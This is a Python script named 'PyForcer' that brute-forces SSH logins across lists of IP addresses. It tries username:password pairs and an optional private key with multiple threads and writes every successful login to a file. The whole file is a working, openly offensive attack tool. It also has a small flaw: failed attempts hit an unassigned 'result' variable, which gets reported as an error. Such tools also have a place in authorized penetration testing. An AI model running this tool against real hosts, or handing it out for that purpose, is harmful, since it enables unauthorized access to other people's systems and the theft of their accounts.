#!/usr/bin/env python3
import sys
import argparse
import socket
import os
import paramiko
import concurrent.futures

def is_valid_ipv4(ip):
    try:
        socket.inet_pton(socket.AF_INET, ip)
        return True
    except socket.error:
        return False

def read_credentials_file(credentials_file):
    credentials = []
    with open(credentials_file, "r") as file:
        for line in file:
            line = line.strip()
            if ":" in line:
                username, password = line.split(":", 1)
                credentials.append((username, password))
    return credentials

def get_private_key(key_file):
    try:
        private_key = paramiko.RSAKey(filename=key_file)
        return private_key
    except paramiko.SSHException:
        try:
            private_key = paramiko.DSSKey(filename=key_file)
            return private_key
        except paramiko.SSHException:
            try:
                private_key = paramiko.ECDSAKey(filename=key_file)
                return private_key
            except paramiko.SSHException:
                print(f"File \"{key_file}\" is an invalid private key type, exiting.")
                sys.exit()

def test_ssh_credentials(ip, port, credentials, key_file, output_file):
    successful_logins = []
    for username, password in credentials:
        try:
            ssh_client = paramiko.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            auth_method = None

            if key_file:
                private_key = get_private_key(key_file)
                if private_key:
                    try:
                        ssh_client.connect(ip, port=port, username=username, pkey=private_key, timeout=10)
                        auth_method = "key"
                    except paramiko.AuthenticationException:
                        pass  # Authentication with key failed
            if not auth_method:
                try:
                    ssh_client.connect(ip, port=port, username=username, password=password, timeout=10)
                    auth_method = "password"
                except paramiko.AuthenticationException:
                    pass  # Authentication with password failed

            ssh_client.close()

            if auth_method == "password":
                result = f"PASSWORD {ip}:{port} {username}:{password}"
            elif auth_method == "key":
                result = f"KEY {ip}:{port} {username}:{password}"
            
            print(f"{result}")
            successful_logins.append(result)
        except paramiko.SSHException as e:
            print(f"An SSH error occurred: {ip}:{port}: {e}")
        except Exception as e:
            print(f"An unexpected error occurred: {ip}:{port}: {e}")

    with open(output_file, 'a') as f:
        for result in successful_logins:
            f.write(result + "\n")

def main():
    # Create a parser for command-line arguments
    parser = argparse.ArgumentParser(description="PyForcer - A multi-threaded SSH brute forcing tool for username+password and private keyfile combinations")
    # Add arguments
    parser.add_argument("ip_input", nargs='?', default=None, help="IP address or path to a file with IP addresses")
    parser.add_argument("output_file", help="Path to the output file")
    parser.add_argument("--port", type=int, default=22, help="Port number (default: 22)")
    parser.add_argument("--creds", help="Path to a file containing username and password combinations")
    parser.add_argument("--keyfile", help="Path to a private key file for authentication (optional)")
    parser.add_argument("--threads", type=int, default=1, choices=range(1, 16), help="Number of threads to run concurrently (15 max)")
    print("PyForcer - SSH bruteforcing done properly.\n")
    # Parse the arguments
    args = parser.parse_args()
    if args.ip_input:
        if is_valid_ipv4(args.ip_input):
            ip_addresses = [args.ip_input]
        else:
            if os.path.isfile(args.ip_input):
                with open(args.ip_input, "r") as file:
                    ip_addresses = [line.strip() for line in file]
            else:
                print("Invalid input: not a valid IP address or file does not exist.")
                return
    else:
        ip_addresses = []
    if args.keyfile:
        if os.path.isfile(args.keyfile):
            pass
        else:
            sys.exit("Invalid input: specified keyfile does not exist!")
    if args.creds:
        if os.path.isfile(args.creds):
            credentials = read_credentials_file(args.creds)
        else:
            print("ERROR: specified credentials file does not exist.")
            return
    else:
        credentials = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = []
        for ip in ip_addresses:
            futures.append(executor.submit(test_ssh_credentials, ip, args.port, credentials, args.keyfile, args.output_file))

        concurrent.futures.wait(futures, timeout=None, return_when=concurrent.futures.ALL_COMPLETED)
if __name__ == "__main__":
    main()